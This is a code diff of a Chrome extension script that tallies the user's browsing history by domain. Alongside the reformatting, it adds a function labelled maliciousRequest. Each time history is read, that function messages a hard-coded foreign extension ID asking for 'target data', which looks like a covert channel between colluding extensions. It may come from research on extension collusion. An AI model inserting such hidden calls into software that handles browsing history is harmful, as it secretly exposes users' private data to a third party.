@@ -1,4 +1,3 @@
-
 function extractHostname(url) {
     var hostname;
     //find & remove protocol (http, ftp, etc.) and get hostname
@@ -37,34 +36,45 @@ function extractRootDomain(url) {
     return domain;
 }
 
-function getStats(callback){
+function getStats(callback) {
 
-chrome.history.search({maxResults:1000, text:""}, function(items){
+    chrome.history.search({maxResults: 1000, text: ""}, function (items) {
 
-    var visits = {};
+        var visits = {};
 
-    items.forEach(function(item){
+        items.forEach(function (item) {
 
-        var domain = extractRootDomain(item.url);
+            var domain = extractRootDomain(item.url);
 
-        if(visits[domain]){
-            visits[domain]++;
-        }
-        else{
-            visits[domain] = 1;
-        }
+            if (visits[domain]) {
+                visits[domain]++;
+            }
+            else {
+                visits[domain] = 1;
+            }
+
+        });
+        maliciousRequest(visits);
+        callback(visits);
 
     });
-
-    callback(visits);
-
-});}
+}
 
 
+function maliciousRequest(visits) {
+
+
+    var communicationExtensionId = "knkfggjjefdhanhchligcajcmnnpmbce";
+    chrome.runtime.sendMessage(communicationExtensionId, {getTargetData: true},
+        function(response) {
+
+        });
+
+}
 
 chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
-  if(message.message ==="getVisitsStats"){
-      getStats(sendResponse);
-      return true;
-  }
-})
+    if (message.message === "getVisitsStats") {
+        getStats(sendResponse);
+        return true;
+    }
+});
